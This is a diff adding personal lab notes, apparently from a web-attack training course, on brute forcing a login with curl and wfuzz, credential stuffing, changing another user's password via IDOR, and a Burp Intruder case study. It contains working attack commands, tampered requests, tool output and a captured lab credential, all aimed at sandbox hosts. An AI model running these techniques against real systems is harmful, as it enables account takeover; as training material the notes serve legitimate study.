@@ -137,10 +137,122 @@ The idea behind our attack in this section is relatively straightforward. We're 
 
 One of the weakest forms of CAPTCHA implementation is when the page includes all the information needed to answer the CAPTCHA. Right Click > Inspect Element and note whether or not this CAPTCHA information is provided in the source code.
 
+## Brute Forcing
 
+Brute Forcing is one of the most common attacks in penetration testing. It provides a powerful way to gain access to accounts when we do not have compromised credentials to work with. The idea is that we want to perform many requests against a single target user and examine the output for any potential success.
 
+For the practice we use bruteUser and bogusPassword for the login page while running intercept on burpsuite. This gives us the endpoint we are brute forcing and the POST data.
 
+	POST /brute-forcing/login/index.php HTTP/1.1
+	username=bruteUser&password=bogusPassword
 
+Next we'll use curl to determine what a failed response provides in character bytes
 
+	curl -so /dev/null -d "username=bruteUser&password=bogusPassword" -X POST http://ca-sandbox:80/brute-forcing/login/ -w '%{size_download}'
+	8324
 
+This tells us a failed output is 8324 bytes and we can use wfuzz with the -hh (hush) option to ignore return byte-size values of 8324
+
+	wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -d "username=bruteUser&password=FUZZ" --hh 8324 http://CA-Sandbox:80/brute-forcing/login/
+	
+	********************************************************
+	* Wfuzz 3.1.0 - The Web Fuzzer                         *
+	********************************************************
+	
+	Target: http://CA-Sandbox:80/brute-forcing/login/
+	Total requests: 10000
+	
+	=====================================================================
+	ID           Response   Lines    Word       Chars       Payload
+	=====================================================================
+	000009533:   200        299 L    669 W      8592 Ch     "1234567890-"
+	
+	Total time: 0
+	Processed Requests: 10000
+	Filtered Requests: 9999
+	Requests/sec.: 0
+> sudo apt install seclists
+
+Running the command outputs the above where the payload is equal to the password for the user, this allows us to log in. Once in the system we can collect user accounts, a credential in plaintext, and save it all for future use.
+	developer:jd983hs91aa
+	Users:
+		root
+		frieda
+		brandon
+		royale
+		alyx
+		tottie
+		julianna
+		calin
+		aveline
+		kody
+		robin
+		brittney
+		julius
+		buck
+		catharine
+		starr
+		joanie
+		david
+		greg
+		kaleb
+	
+[Brute Forcing, OWASP](https://owasp.org/www-community/attacks/Brute_force_attack)
+
+## Credential Stuffing
+
+Credential stuffing is the opposite of brute force but maintains a similarity. Instead of throwing a bunch of passwords at one user, we'll throw a bunch of users at one password. In this case we have the password found during the brute force, and using a similar wfuzz command, we will attempt to find the user it belongs to by creating our own wordlist of users, and then plugging that into wfuzz.
+
+	kali@kali:~$ wfuzz -c -z file,./credstuff_wordlist.txt -d "username=FUZZ&password=jd983hs91aa" --hh 8342 http://CA-Sandbox:80/credential-stuffing/login/
+
+	********************************************************
+	* Wfuzz 3.1.0 - The Web Fuzzer                         *
+	********************************************************
+	
+	Target: http://CA-Sandbox:80/credential-stuffing/login/
+	Total requests: 20
+	
+	=====================================================================
+	ID           Response   Lines    Word       Chars       Payload
+	=====================================================================
+	
+	000000020:   200        299 L    669 W      8622 Ch     "kaleb"
+	
+	Total time: 0.094734
+	Processed Requests: 20
+	Filtered Requests: 19
+	Requests/sec.: 211.1164
+
+## Password Change Attacks with IDOR
+
+The premise behind a password change attack is to change the password of an account that is not our own. This can often be done by intercepting the POST data of a password change form and manipulating it so that we end up changing another user's password. Because we are attempting to modify an object in the request submission, this type of attack would technically fall into the category of Insecure Direct Object Referencing (IDOR).
+
+For this, we login as a regular user and go to change out password, upon doing so we want to turn on intercept in burp so we can capture the POST request.
+
+	POST /change-attacks/profile/ HTTP/1.1
+	currentPass=attacker&newPass=offsec&currentUser=attacker%40thinc.local (%40 is the @ symbol)
+
+With this, we can modify the POST request to any user in the prefix of the email and any password
+
+	currentPass=attacker&newPass=offsecwuzhere&currentUser=robin%40thinc.local
+
+## Case Study
+
+Learning to use Intruder with BurpSuite in an attempt to brute force koel
+
+Starting I navigate to http://koel and take note of the login page and attempt a random login with bruteUserExercise@thinc.local and password of bogusPassword. I simply enter it with nothing fancy then go back to burp and review http history to see the request. Upon viewing them, there is one that contains the email and password I used at login, I send these to intruder by right-clicking it.
+
+Once in intruder, I will add in the payload positions modifying the original request from this:
+
+	{"email":"bruteUserExercise@thinc.local","password":"bogusPassword"}
+
+To this:
+
+	{"email":"bruteUserExercise@thinc.local","password":"§§"}
+
+> The §§ denote the position of the payload
+
+After this, I will load the seclists wordlist top 100 into the payloads section on the right and start attack. 
+
+Once the attack begins, I am looking for a 200 response code which will let me know there was a successful attempt.
 
